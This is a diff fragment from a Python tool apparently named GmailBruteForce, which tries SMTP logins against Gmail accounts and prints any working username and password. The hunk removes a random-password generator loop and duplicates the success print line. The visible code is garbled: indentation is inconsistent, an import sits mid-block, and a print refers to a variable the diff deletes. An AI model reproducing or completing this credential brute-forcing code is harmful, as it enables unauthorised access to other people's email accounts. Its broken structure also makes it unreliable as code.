@@ -32,14 +32,8 @@ class GmailBruteForce():
                     self.smtp.login(user,password)
                     print(("\033[1;37machei -> %s " % user + " -> %s \033[1;m" % password )) 
 			import string,random
-ram =[]
-for i in range(1000):
-	senha = ''
-	for i in range(10):
-		senha+= random.choice(string.ascii_letters+' ')
-	if not senha in ram:
-		ram.append(senha)
 		print(senha)
+		print(("\033[1;37machei -> %s " % user + " -> %s \033[1;m" % password )) 
 
                     self.smtp.quit()
                     self.init_smtplib()
